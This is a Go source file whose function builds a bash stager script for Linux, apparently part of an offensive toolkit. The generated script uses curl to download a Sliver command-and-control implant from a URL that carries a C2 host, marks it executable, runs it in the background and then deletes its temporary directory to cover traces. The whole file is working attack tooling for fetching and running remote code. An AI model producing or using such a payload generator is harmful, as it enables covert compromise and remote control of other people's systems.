package bash

import (
	"fmt"
	"strings"
)

// Generate creates a simple bash payload
func Generate(implantURL, c2Host string) string {
	var script strings.Builder

	script.WriteString("#!/bin/bash\n")
	script.WriteString("# Sliver implant downloader for Linux\n\n")

	// Build the full URL
	fullURL := fmt.Sprintf("%s/linux?c2=%s", implantURL, c2Host)

	script.WriteString("# Download and execute Sliver implant\n\n")

	script.WriteString("# Create temp directory\n")
	script.WriteString("TMP_DIR=$(mktemp -d)\n")
	script.WriteString("cd \"$TMP_DIR\" || exit 1\n\n")

	script.WriteString("# Download the implant\n")
	script.WriteString("echo \"[*] Downloading implant...\"\n")
	script.WriteString(fmt.Sprintf("curl -s -o implant \"%s\"\n\n", fullURL))

	script.WriteString("# Make it executable\n")
	script.WriteString("chmod +x implant\n\n")

	script.WriteString("# Execute in background\n")
	script.WriteString("echo \"[*] Executing implant...\"\n")
	script.WriteString("./implant &\n\n")

	script.WriteString("# Clean up after a delay\n")
	script.WriteString("(sleep 5 && rm -rf \"$TMP_DIR\") &\n\n")

	script.WriteString("echo \"[*] Done\"\n")

	return script.String()
}
